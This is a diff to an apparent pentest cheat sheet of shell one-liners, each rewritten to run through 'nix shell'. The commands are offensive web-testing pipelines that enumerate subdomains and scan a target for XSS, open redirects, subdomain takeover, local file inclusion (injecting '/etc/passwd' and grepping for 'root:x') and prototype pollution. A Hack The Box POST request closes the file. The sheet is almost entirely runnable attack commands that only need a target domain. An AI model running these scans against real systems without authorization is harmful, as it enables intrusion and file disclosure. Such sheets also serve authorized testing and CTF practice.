@@ -1,36 +1,36 @@
 % Web testing, xss/redirect/prototype polution/ screenshots
 
 # subdirectory finder for domains
-subfinder -d <target-domain> -o domains_subfinder_$1
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#subfinder -c subfinder -d <target-domain> -o domains_subfinder_$1
 
 # amass enumeration on target domain
-amass enum --passive -d <target-domain> -o domains_$1
-cat domains_subfinder_$1 | tee -a domain_$1
-cat domains_$1 | filter-resolved | tee -a domains_$1.txt
-cat domains_$1.txt | httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#amass -c amass enum --passive -d <target-domain> -o domains_$1
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat domains_subfinder_$1 | tee -a domain_$1
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat domains_$1.txt | httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
 
 # Test for Open-Redirect Bug
-waybackurls <target-domain> | grep -a -i \=http | bhedak 'http://redirect.com' | while read host do;do curl -s -L $host -I|grep "redirect.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#waybackurls -c waybackurls <target-domain> | grep -a -i \=http | bhedak 'http://redirect.com' | while read host do;do curl -s -L $host -I|grep "redirect.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
 
 # Find JS File
-assetfinder --subs-only <target-domain> | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#assetfinder -c assetfinder --subs-only <target-domain> | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
 
 # Find Subdomains TakeOver
-subfinder -d <target-domain> >> domains ; assetfinder --subs-only <target-domain> >> domains ; amass enum -norecursive -noalts -d <target-domain> >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#subfinder -c subfinder -d <target-domain> >> domains ; assetfinder --subs-only <target-domain> >> domains ; amass enum -norecursive -noalts -d <target-domain> >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
 
 # Find LFI
-gau <target-domain> | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#gau -c gau <target-domain> | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 
 # Find Prototype Pollution
-subfinder -d <target-domain> -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#subfinder -c subfinder -d <target-domain> -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
 
 # take a screenshot of every page from domain in txt file with aquatone (https://github.com/michenriksen/aquatone/releases)
-cat <file> | aquatone -ports 80,443,3000,3001
-cat <file> | aquatone -out ./aquatone_screenshots -screenshot-timeout 1000
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat <file> | aquatone -ports 80,443,3000,3001
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat <file> | aquatone -out ./aquatone_screenshots -screenshot-timeout 1000
 
 # take a screenshot of urls from txt file with wkhtmltopdf
-cat <file> | while read line; do wkhtmltoimage $line $line.png; done
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c cat <file> | while read line; do wkhtmltoimage $line $line.png; done
 
 
 # hack the box cheat: Misc curl w/ POST
-curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
+NIXPKGS_ALLOW_UNFREE=1 nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#curl -c curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
